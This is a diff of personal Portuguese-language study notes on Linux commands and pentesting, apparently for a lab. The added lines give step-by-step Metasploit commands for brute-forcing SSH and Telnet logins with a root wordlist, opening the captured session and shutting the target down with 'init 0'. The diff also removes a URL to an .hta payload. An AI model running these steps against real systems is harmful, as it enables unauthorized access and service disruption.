@@ -6,6 +6,8 @@ clear -> limpa a tela
 exit -> sai do usuario atual
 
 Comando uteis
+  ip s a -> mostra o ip
+  ifconfig -> motra o ip
   apt install -f -> Corrigir problemas de instalação
   curl ifconfig-me -> Ve o ip externo.
   env -> variaveis de ambiente
@@ -26,6 +28,7 @@ Comando uteis
   canal 0 (<) -> canal de entrada
   canal 1 (>)-> canal saida padrão
   canal 2 (>)-> canal saida de erro
+  | -> redirenciona pra outro comando
 
 Visualizar arquviso 
   wc arquivo.txt -> Mostra numero de bits, numero de linhas, numero de palavra
@@ -170,6 +173,7 @@ OWASP
   <user username="tomcat" password="s3cret" roles="manager"/>
 
 Metasploit
+  vim /usr/share/metasploit-framework/data/wordlists/root_userpass.txt -> wordlist
   msfdb init -> inicar o Metasploit
   msfconsole -> abrir o Metasploit
   db_status -> verificar status do banco
@@ -196,8 +200,17 @@ Metasploit
     depois do alvo ter executado -> ctrl + d pra sair do expoit
       sessions
       e começa a exploração
-
-http://192.168.100.71:8888/iNAndyBw8YqXQ.hta
+  Brute force ssh e telnet linux
+    use auxiliary/scanner/ssh/ssh_login -> ssh
+    use auxiliary/scanner/telnet/telnet_login -> telnet
+    show options
+    set rhosts 192.168.100.78
+    set verbose true
+    set userpass_file /usr/share/metasploit-framework/data/wordlists/root_userpass.txt -> caminho da wordlist
+    run
+    depois de ter pego o acesso entrar na sessão
+    sessions -i numero_id_Sessao
+    init 0 -> desliga a maquina
 
 Baixar paginas e projetos web
   wget http://localhost:8080/bodgeit/ -> baixa uma pagina web em html
